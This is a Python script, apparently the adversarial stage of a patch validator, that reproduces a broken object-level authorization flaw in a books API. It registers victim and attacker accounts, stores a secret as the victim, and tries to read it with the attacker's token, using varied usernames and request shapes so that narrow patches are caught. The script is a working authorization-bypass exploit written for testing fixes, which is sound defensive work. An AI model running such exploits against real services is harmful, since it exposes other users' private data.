"""Adversarial variant of the books-read BOLA (validator's adversarial stage).

Same class of attack as exploit.py, but deliberately VARIED so a narrow patch
that only special-cases the primary reproducer is still caught:
  - different attacker/victim usernames (alice/mallory, not victim/attacker)
  - different target object title prefix (journal_, not book_)
  - different request shape (extra query string + custom header)

A correct owner-scoped fix blocks this too. A patch that, say, only denies
when the owner name contains "victim" will leak here.

Exit 0  => exploit SUCCEEDED (still leaks -> patch incomplete).
Exit !=0 => BLOCKED.
Prints a machine-readable final line:  RESULT {json}

Usage: python adversarial.py --base-url http://localhost:5001
"""
import argparse
import json
import secrets
import sys

import requests


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", required=True)
    args = ap.parse_args()
    base = args.base_url.rstrip("/")

    sfx = secrets.token_hex(3)
    victim, attacker = f"alice_{sfx}", f"mallory_{sfx}"
    pw = "pw12345678"
    title, secret = f"journal_{sfx}", f"CONFIDENTIAL_{sfx}"

    s = requests.Session()
    for u in (victim, attacker):
        s.post(f"{base}/users/v1/register",
               json={"username": u, "password": pw, "email": f"{u}@example.com"}, timeout=10)
    tv = s.post(f"{base}/users/v1/login",
                json={"username": victim, "password": pw}, timeout=10).json().get("auth_token")
    s.post(f"{base}/books/v1", json={"book_title": title, "secret": secret},
           headers={"Authorization": f"Bearer {tv}"}, timeout=10)
    ta = s.post(f"{base}/users/v1/login",
                json={"username": attacker, "password": pw}, timeout=10).json().get("auth_token")
    # varied request shape: extra query param + custom header
    r = s.get(f"{base}/books/v1/{title}?view=full",
              headers={"Authorization": f"Bearer {ta}", "X-Client": "mobile"}, timeout=10)
    body = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
    leaked = body.get("secret") == secret

    result = {"defect": "books-read", "kind": "adversarial", "leaked": leaked,
              "status": r.status_code, "body": body}
    if leaked:
        print(f"EXPLOIT-SUCCEEDED (adversarial): read {victim}'s secret {body.get('secret')!r}")
    else:
        print(f"BLOCKED (adversarial): status={r.status_code} body={body}")
    print("RESULT " + json.dumps(result))
    return 0 if leaked else 1


if __name__ == "__main__":
    sys.exit(main())
